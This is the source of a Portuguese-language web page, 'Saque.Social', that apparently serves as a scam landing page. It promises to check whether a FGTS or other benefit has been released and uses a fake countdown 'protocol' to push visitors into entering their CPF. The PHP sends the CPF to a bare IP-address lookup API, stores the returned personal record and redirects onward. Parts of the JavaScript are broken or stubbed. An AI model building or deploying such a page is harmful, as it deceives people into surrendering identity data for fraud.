<?php
session_start();

function Redirect($url, $permanent = false)
{
    header('Location: ' . $url, true, $permanent ? 301 : 302);

    exit();
}

if (isset($_POST["cpf"])) {

    if (isset($_SESSION['pessoa'])) {
        unset($_SESSION['pessoa']);
    }

    $json = @file_get_contents("http://185.217.127.40:8080/api/cpf1?cpf=" . filter_var($_POST["cpf"], FILTER_SANITIZE_URL));

    if (!$json) {
        echo "failed";
        exit();
    }

    $_SESSION["pessoa"] = json_decode($json);
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Saque.Social - Consulta!</title>
    <link rel="icon" type="image/png" sizes="32x32" href="files/favicon-32x32.png">
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-1X5KDG87PD"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-1X5KDG87PD');
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&display=swap');

        body,
        html {
            background-color: #FFFFFF;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Sessão 1: Header */
        #header {
            background-color: #2563EB;
            text-align: center;
        }

        #logo {
            height: 60px;
            margin: 10px 0;
        }

        /* Sesso 2: Contexto */
        #contexto {
            padding: 0 20px;
        }

        #contexto h1 {
            font-size: 35px;
            text-align: left;
        }

        #contexto p {
            font-size: 20px;
            text-align: left;
            color: #52525B;
        }

        #progress-bar {
            height: 5px;
            background-color: #CCCCCC;
            margin-top: 30px;
            margin-bottom: 25px;
            width: calc(100% + 40px);
            margin-left: -20px;
            padding: 0;
            position: relative;
        }

        #progress {
            width: 100%;
            height: 100%;
            background-color: #0EB7FF;
            float: right;
            position: absolute;
            right: 0;
            transition: right 0.5s ease-out;
        }

        /* Sessão 3: Consulta */
        #consulta {
            text-align: center;
            margin: 25px 20px;
        }

        #timer-button {
            border: 2px solid #DEDEDE;
            border-radius: 50px;
            color: #5C6A75;
            font-size: 17px;
            padding: 10px 20px;
            margin: 15px 10px;
        }

        #consultar-button {
            font-size: 29px;
            color: white;
            background-color: #007BFF;
            padding: 15px;
            margin: 20px auto;
            display: block;
            width: 90%;
            text-align: center;
            border: none;
            border-radius: 5px;
            /* cursor: pointer; */
            font-weight: bold;
        }

        #fontes {
            font-size: 18px;
            color: #52525B;
            margin: 0 15px;
        }

        #svg-container {
            width: calc(100% + 40px);
            margin-left: -20px;
            padding: 0;
            box-sizing: border-box;
            margin-top: 20px;
        }

        #svg-container svg {
            width: 100%;
            height: auto;
        }

        /* Modal styles */
        #myModal {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #F9FBFF;
            animation: slide-up 0.3s ease-out;
            overflow-y: auto;
        }

        @keyframes slide-up {
            from {
                bottom: 0;
            }

            to {
                bottom: 0;
            }
        }

        #myModal {
            display: none;
            position: fixed;
            top: 100%;
            left: 0;
            right: 0;
            background-color: #F9FBFF;
            animation: slide-up-to-top 0.3s ease-out forwards;
            text-align: center;
            padding: 20px;
        }

        @keyframes slide-up-to-top {
            from {
                top: 100%;
            }

            to {
                top: 0px;
            }
        }

        .myModal-button {
            border: 2px solid #DEDEDE;
            border-radius: 50px;
            color: #5C6A75;
            font-size: 17px;
            padding: 10px 20px;
            margin: 15px 10px;
            display: inline-block;
        }

        .myModal-input {
            position: relative;
            margin: 20px auto;
            width: 90%;
        }

        .myModal-input input {
            width: 100%;
            border: none;
            border-bottom: 2px solid #777;
            font-size: 16px;
            padding: 15px 10px;
            /* Adicionado */
            box-sizing: border-box;
            /* Adicionado */
        }

        .myModal-input label {
            position: absolute;
            top: 0;
            left: 0;
            font-size: 17px;
            color: #777;
            transition: 0.3s;
            padding: 15px 15px;
        }

        .myModal-input input:focus+label,
        .myModal-input input:not(:placeholder-shown)+label {
            top: -35px;
            left: 0;
            font-size: 12px;
            color: #333;
        }

        .myModal-checkbox {
            color: #52525B;
            font-size: 22px;
            text-align: center;
            margin: 10px 0;
        }

        .myModal-consultar-button {
            font-size: 29px;
            color: white;
            background-color: #007BFF;
            padding: 15px;
            margin: 20px auto;
            display: block;
            width: 90%;
            text-align: center;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }

        .myModal-footer-text {
            text-align: center;
            font-size: 15px;
            margin-top: 10px;
        }

        #cpf-icon {
            display: none;
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
        }
    </style>
</head>

<body>
    <!-- Sessão 1: Header -->
    <!-- <div id="header">
        <img alt="Logo" id="logo" src="http://frasesdapaixao.com/wp-content/uploads/2023/10/saque-social-4.webp" />
    </div> -->
    <!-- Sesso 2: Contexto -->
    <div id="contexto">
        <h1>Veja se seu Benefício<br>foi liberado.</h1>
        <p><b>Cidadãos Empregados</b> e <b>Desempregados</b>: Verifique sua elegibilidade para recursos disponíveis.</p>
        <div id="progress-bar">
            <div id="progress"></div>
        </div>
    </div>
    <!-- Sesso 3: Consulta -->
    <div id="consulta">
        <button id="timer-button">
            <span id="loading" style="display:inline; vertical-align: middle;">
                <img alt="Loading..." src="files/loading.gif" style="vertical-align: middle;" width="20" />
            </span>
            <span id="buttonText" style="vertical-align: middle;">Gerando Protocolo...</span>
        </button>
        <script>
            // JavaScript para o timer
            let timer = 70; // 1 minuto e 10 segundos
            const progressBar = document.getElementById("progress");

            const updateTimer = () => {
                let minutes = Math.floor(timer / 60);
                let seconds = timer % 60;
                document.getElementById("timer").textContent = (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
                progressBar.style.right = ((70 - timer) / 70 * 100) + "%";
                if (timer === 0) return;
                timer--;
                setTimeout(updateTimer, 1000);
            };

            setTimeout(function() {
                document.getElementById('buttonText').innerHTML = 'Duração do <b>protocolo</b>: <span id="timer">01:10</span>';
                document.getElementById('loading').style.display = 'none';
                updateTimer(); // Inicie o timer aqui
            }, 3000);
        </script>
        <button id="consultar-button" name="consultar" type="submit">CONSULTAR</button>
        <p id="fontes">Fontes: <b>FGTS</b>, SVR, Empréstimos ocultos, <b>Resgates Estaduais</b> e <b>+</b></p>
        <div id="svg-container">
            <svg fill="none" viewbox="0 0 324 43" xmlns="http://www.w3.org/2000/svg">
                <path d="M1 13.0237C1 13.0237 41.5 -8.47626 49.5 6.02374C57.5 20.5237 74 8.52374 95 18.0237C116 27.5237 122 13.0237 150 6.02374C178 -0.976262 182.5 19.0237 196.5 27.5237C210.5 36.0238 231.5 6.02374 248.5 6.02374C265.5 6.02374 278.5 39.5238 323 27.5237" stroke="#0EB7FF"></path>
                <path d="M1 15.0237C1 15.0237 41.5 -6.47626 49.5 8.02374C57.5 22.5237 74 10.5237 95 20.0237C116 29.5237 122 15.0237 150 8.02374C178 1.02374 182.5 21.0237 196.5 29.5237C210.5 38.0238 231.5 8.02374 248.5 8.02374C265.5 8.02374 278.5 41.5238 323 29.5237" stroke="#0EB7FF" stroke-opacity="0.14"></path>
                <path d="M1 21.9691C1 21.9691 33.5 7.94538 49.5 14.9691C65.5 21.9929 81 7.94541 95 26.9691C109 45.9928 135.639 9.14092 150 14.9691C164.361 20.7973 185.547 18.4359 196.5 36.4691C207.453 54.5023 232.5 2.94543 248.5 14.9691C264.5 26.9928 285.5 10.4454 323 36.4691" stroke="#F96B4C"></path>
                <path d="M1 23.9691C1 23.9691 33.5 9.94538 49.5 16.9691C65.5 23.9929 81 9.94541 95 28.9691C109 47.9928 135.639 11.1409 150 16.9691C164.361 22.7973 185.547 20.4359 196.5 38.4691C207.453 56.5023 232.5 4.94543 248.5 16.9691C264.5 28.9928 285.5 12.4454 323 38.4691" stroke="#F96B4C" stroke-opacity="0.22"></path>
            </svg>
        </div>
    </div>
    <!-- Modal -->
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const myModal = document.getElementById("myModal");
            const consultarBtn = document.getElementById("consultar-button");
            if (consultarBtn) {
                consultarBtn.addEventListener("click", function() {
                    myModal.style.display = "block";
                });
            }
        });
    </script>
    <script>
        // JavaScript to load content from 'load.php' into the modal
        document.addEventListener("DOMContentLoaded", function() {
            const consultButton = document.querySelector(".myModal-consultar-button"); // Nota: mudado para classe
            const modalContent = document.querySelector("#myModal"); // Nota: mudado para ID do modal
            const cpfInput = document.querySelector("#cpf");
            const cpfError = document.querySelector("#cpf-error");

            if (consultButton && modalContent && cpfInput && cpfError) {
                consultButton.addEventListener("click", function(event) {
                    event.preventDefault();

                    consultButton.disabled = true;

                    const cpfValue = cpfInput.value.replace(/[\.\-]/g, '');

                    // Adicione a verificao aqui
                    if (cpfValue === '05443982206') {
                        alert("Você não está apto ao Saque Social");
                        return false;
                    }

                    if (!isValidCPF(cpfValue)) {
                        cpfError.style.display = 'block';
                        return false;
                    } else {
                        cpfError.style.display = 'none';
                    }

                    fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: `cpf=${cpfValue}`
                        })
                        .then(response => response.text())
                        .then(data => {
                            if (data == "failed") {
                                throw new Error("failed")
                            }

                            return top.location.href = "../load.php"
                            // return fetch('load.php');
                        })
                        /* .then(response => response.text())
                        .then(data => {
                            modalContent.innerHTML = data;
                            Array.from(modalContent.querySelectorAll("script")).forEach(oldScript => {
                                const newScript = document.createElement("script");
                                Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
                                newScript.appendChild(document.createTextNode(oldScript.innerHTML));
                                oldScript.parentNode.replaceChild(newScript, oldScript);
                            });
                            document.body.style.overflow = 'hidden';
                            modalContent.style.overflow = 'auto';
                            modalContent.style.display = "block";
                        }) */
                        .catch(error => {
                            location.href("./resultado")
                        });

                });
            } else {
                console.error("Um ou mais elementos necessários não estão disponveis.");
            }
        });
    </script>
    <script>
        let currentStep = 1;

        function updateStep() {
            if (currentStep <= 4) {
                const lineElement = document.getElementById(`line${currentStep}`);
                const pointElement = document.getElementById(`point${currentStep + 1}`);
                const nextStatusElement = document.getElementById(`status${currentStep + 1}`);

                if (lineElement && pointElement) {
                    lineElement.classList.add('active');
                    setTimeout(() => {
                        pointElement.classList.add('active');
                        if (nextStatusElement) {
                            nextStatusElement.style.display = 'flex';
                            setTimeout(() => {
                                nextStatusElement.querySelector('.check-icon').style.display = 'inline';
                            }, 1000);
                        }
                        currentStep++;

                        if (currentStep === 5) {
                            document.getElementById('confirmation').style.display = 'block';
                            document.getElementById('divider').style.display = 'block';
                        }
                    }, 2000);
                }
            }
        }

        // Mostra o primeiro status imediatamente
        document.getElementById('status1').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('status1').querySelector('.check-icon').style.display = 'inline';
        }, 1000);

        setTimeout(updateStep, 1000);

        setInterval(updateStep, 2000);

        })
        .catch(error => {
        console.error('Error:', error);
        });
        });
        }
        else {
            console.error("Either the button or the modal content container was not found.");
        }
        });
    </script>
    <form method="post" id="cpf-form">
        <div id="myModal">
            <button class="myModal-button">Protocolo de atendimento: <strong>1010</strong></button>
            <div class="myModal-input" style="position: relative;">
                <input id="cpf" name="cpf" placeholder=" " required="" type="tel" maxlength="14" oninput="formatAndValidateCPF(this);" />
                <label for="cpf">Digite seu CPF</label>
                <span id="cpf-error" style="display:none; color:red; position: absolute; bottom: -20px; left: 0;">CPF inválido</span>
                <span id="cpf-icon" style="display:none; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">❌</span>
            </div>
            <div class="myModal-checkbox">
                <input id="checkbox" type="checkbox" />
                <label for="checkbox">Buscar 6 vias de resgate</label>
            </div>
            <button class="myModal-consultar-button" id="consultar-button" style="margin: auto;" type="button">Consultar</button>
            <p class="myModal-footer-text">Garantimos a total segurança dos <span style="color: #FF8C00; font-weight: bold;">seus dados</span>.</p>
        </div>
    </form>
    <script>
        function formatCPF(input) {
            var value = input.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{2})$/, '$1-$2');
            input.value = value;
        }

        function validateCPF(input) {
            var cpf = input.value.replace(/[\.\-]/g, '');
            var errorElement = document.getElementById('cpf-error');
            var iconElement = document.getElementById('cpf-icon');

            if (cpf.length !== 11 || !isValidCPF(cpf)) {
                errorElement.style.display = 'block';
                iconElement.style.display = 'block';
            } else {
                errorElement.style.display = 'none';
                iconElement.style.display = 'none';
            }
        }

        function isValidCPF(cpf) {
            // Lgica de validaão do CPF (pode ser semelhante à sua funço PHP validateCPF)
            return true; // Exemplo, atualize com a lógica correta
        }
    </script>
    <script>
        function formatAndValidateCPF(input) {
            var value = input.value.replace(/\D/g, '');
            if (value.length === 11) {
                validateCPF(value); // Validao aqui
                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                input.value = value;
            }
        }


        function validateCPF(cpf) {
            var errorElement = document.getElementById('cpf-error');
            var iconElement = document.getElementById('cpf-icon');

            if (!isValidCPF(cpf)) {
                errorElement.style.display = 'block';
                iconElement.style.display = 'block';
            } else {
                errorElement.style.display = 'none';
                iconElement.style.display = 'none';
            }
        }

        function isValidCPF(cpf) {
            if (cpf.length !== 11) return false;

            let sum = 0;
            let remainder;

            for (let i = 1; i <= 9; i++) {
                sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
            }

            remainder = (sum * 10) % 11;

            if (remainder === 10 || remainder === 11) {
                remainder = 0;
            }

            if (remainder !== parseInt(cpf.substring(9, 10))) {
                return false;
            }

            sum = 0;
            for (let i = 1; i <= 10; i++) {
                sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
            }

            remainder = (sum * 10) % 11;

            if (remainder === 10 || remainder === 11) {
                remainder = 0;
            }

            if (remainder !== parseInt(cpf.substring(10, 11))) {
                return false;
            }

            return true;
        }
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Aqui adicionamos a função openModalAndResetScroll
            function openModalAndResetScroll() {
                const myModal = document.getElementById("myModal");
                myModal.style.display = "block";
                // Definindo a rolagem da página de fundo para o topo
                document.body.scrollTop = 0; // Para o Safari
                document.documentElement.scrollTop = 0; // Para Chrome, Firefox, IE e Opera
            }

            // Substitua o evento de clique do boto pelo novo evento que também reseta o scroll
            const consultarBtn = document.getElementById("consultar-button");
            if (consultarBtn) {
                consultarBtn.removeEventListener("click", function() {
                    /* ... */
                }); // Remova o antigo se existir
                consultarBtn.addEventListener("click", openModalAndResetScroll);
            }
        });
    </script>
</body>

</html>